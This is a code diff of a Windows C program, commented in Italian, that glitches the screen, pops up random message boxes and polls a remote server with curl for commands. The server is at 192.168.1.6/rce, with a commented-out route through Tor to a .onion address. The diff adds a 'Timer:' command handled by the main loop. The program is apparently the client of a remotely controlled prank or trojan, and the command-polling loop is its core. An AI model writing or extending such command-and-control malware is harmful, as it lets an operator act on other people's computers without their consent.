@@ -2,6 +2,7 @@
 #include <math.h>
 #include <string.h>
 #include <stdio.h>
+#include <time.h>
 
 /*
 BitBlt usage:
@@ -19,7 +20,7 @@ WHITENESS - white block
 //globalz
 int w; // width
 int h; // heigh
-srdand(time(NULL)); // seed random sul time (sec dal 1970)
+srand(time(NULL)); // seed random sul time (sec dal 1970)
 
 void heightglitch_run() {
     w = GetSystemMetrics(SM_CXSCREEN);
@@ -197,16 +198,27 @@ void msgbox() {
     // se ho x byte devo dichiarare x + 1. Ex: in una frase di 7 char ne devo dikiarare 8 bcz '\0' ('\0' sta sempre alla fine!)
     // if u want puoi togliere il [6] in [], il compilatore capisce dal numero di frasi.
     char frasi[6][20] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
-        "Subwoofer was here",
-        "THWP is the best",
-        "whoami? root!",
-        "ping pong.local",
-        "ZWwza3RyMHcxbmQwdzcgdzRzIGgzcjM=",
-        "... nothing ..."
+        "Non prendere la vita troppo seriamente. Non ne uscirai vivo.",
+        "Il piacere piu' grande della vita e' fare cio' che le persone dicono che non puoi fare",
+        "Dovresti ascoltare piu' hardstyle... Ye, sono serio",
+        "C'e' una canzone che fa: TU TU TU TU TU TU TU TUTUTU BRBRBRBRBRBRBRBRBRBRBRBR",
+        "Secondo te dovrei usare dei puntatori o degli array per mostrare ste frasi con rand()?",
+        "sta funzione e' sperimentale, ho messo frasi di merda"
     };
 
     int randomtext = rand() % 6; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
     MessageBox(NULL, frasi[randomtext], "testo", MB_OK | MB_ICONINFORMATION);
+}
+
+void countdown(int secs) { // passa secs da curl
+    int now = time(NULL); //ora
+    int future = now + secs; // secs futuri
+    while (now < future) {
+        Sleep(1000);
+        now = time(NULL);
+        printf("%d\n",future - now);
+        fflush(stdout); // evita buffering da parte del terminale, non stampa a chunck, solo pro: meno overhead
+    }
 }
 
 int main() {
@@ -214,7 +226,7 @@ int main() {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
         //FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
-        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output
+        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. FILE *pointer apre uno stream su popen, quindi prende l'output (SOLO LA PRIMA RIGA)
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
@@ -317,6 +329,12 @@ int main() {
         }
         else if (strstr(reqtextbuffer, "RandomMSGs")) {
             msgbox();
+        }
+        else if (strstr(reqtextbuffer, "Timer: ")) {
+            char *timer = reqtextbuffer + 7; // 7 char su "Timer: " (more doc? scrolla sopra)
+            timer[strcspn(timer, "\r\n")] = '\0'; // idem qui, checcka sopra
+            int secs = atoi(timer);
+            countdown(secs);
         }
         else {Sleep(20000);}
     }
